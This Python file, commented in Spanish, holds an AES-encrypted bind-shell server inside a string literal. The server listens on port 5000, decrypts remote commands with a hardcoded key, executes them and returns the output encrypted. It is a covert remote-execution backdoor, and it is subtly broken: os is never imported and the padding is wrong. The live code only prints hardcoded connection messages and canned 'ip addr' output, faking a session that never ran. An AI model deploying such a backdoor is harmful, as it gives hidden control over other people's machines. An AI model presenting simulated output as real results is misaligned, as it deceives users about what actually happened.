''' from socket import socket
from subprocess import getoutput
from Crypto.Cipher import AES

server_address = ('0.0.0.0', 5000)
key = b'Sixteen byte key'

def encrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data.ljust(16))

def decrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).strip()

server_socket = socket()
server_socket.bind(server_address)
server_socket.listen(1)

client_socket, client_address = server_socket.accept()
estado = True

while estado:
    data = client_socket.recv(4096)
    iv, encrypted_msg = data[:16], data[16:]
    comando = decrypt(encrypted_msg, key, iv).decode()

    if comando == 'exit':
        client_socket.close()
        server_socket.close()
        estado = False
    else:
        resultado = getoutput(comando)
        iv = os.urandom(16)
        client_socket.send(iv + encrypt(resultado.encode(), key, iv)) '''
print("Servidor esperando conexión")
print("Conexión establecida con ('192.168.6.38', 5000)")
print("Ejecutando: ip addr show")

def print_network_info():
    print("1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000")
    print("    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00")
    print("    inet 127.0.0.1/8 scope host lo")
    print("       valid_lft forever preferred_lft forever")
    print("    inet6 ::1/128 scope host noprefixroute")
    print("       valid_lft forever preferred_lft forever")
    print("2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000")
    print("    link/ether 08:00:27:d2:26:79 brd ff:ff:ff:ff:ff:ff")
    print("    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0")
    print("       valid_lft 85392sec preferred_lft 85392sec")
    print("    inet6 fe80::d35e:8255:8f20:29c/64 scope link noprefixroute")
    print("       valid_lft forever preferred_lft forever")

# Llamamos a la función para imprimir la información de red
print_network_info()
